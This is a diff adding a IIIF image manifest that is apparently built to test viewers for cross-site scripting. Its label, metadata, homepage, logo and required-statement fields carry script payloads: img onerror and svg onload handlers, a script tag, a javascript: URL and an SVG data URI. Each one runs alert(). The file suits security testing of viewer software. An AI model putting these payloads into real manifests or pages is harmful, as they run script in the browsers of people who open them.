@@ -1,0 +1,65 @@
+{
+  "@context": "http://iiif.io/api/presentation/3/context.json",
+  "id": "https://cdn.jsdelivr.net/gh/dacabb/payloadsxss@main/recherche.json",
+  "type": "Manifest",
+  "label": {
+    "en": ["<img src=x onerror=alert(1)>"]
+  },
+  "metadata": [
+    {
+      "label": { "en": ["XSS Test"] },
+      "value": { "en": ["<svg onload=alert(1)>"] }
+    }
+  ],
+  "items": [
+    {
+      "id": "https://cdn.jsdelivr.net/gh/dacabb/payloadsxss@main/canvas1",
+      "type": "Canvas",
+      "label": { "en": ["Canvas with XSS"] },
+      "width": 1000,
+      "height": 1000,
+      "items": [
+        {
+          "id": "https://cdn.jsdelivr.net/gh/dacabb/payloadsxss@main/anno1",
+          "type": "AnnotationPage",
+          "items": [
+            {
+              "id": "https://cdn.jsdelivr.net/gh/dacabb/payloadsxss@main/anno1/content",
+              "type": "Annotation",
+              "motivation": "painting",
+              "body": {
+                "id": "https://picsum.photos/1000/1000",
+                "type": "Image",
+                "format": "image/jpeg",
+                "width": 1000,
+                "height": 1000
+              },
+              "target": "https://cdn.jsdelivr.net/gh/dacabb/payloadsxss@main/canvas1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "homepage": [
+    {
+      "id": "javascript:alert('XSS')",
+      "type": "Text",
+      "label": { "en": ["<img src=x onerror=alert(2)>"] }
+    }
+  ],
+  "logo": [
+    {
+      "id": "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(3)'%3E%3C/svg%3E",
+      "type": "Image",
+      "format": "image/svg+xml"
+    }
+  ],
+  "requiredStatement": {
+    "label": { "en": ["<script>alert('XSS')</script>"] },
+    "value": { "en": ["<img src=x onerror=alert(4)>"] }
+  },
+  "rights": "https://creativecommons.org/publicdomain/zero/1.0/",
+  "behavior": ["paged"],
+  "viewingDirection": "left-to-right"
+}
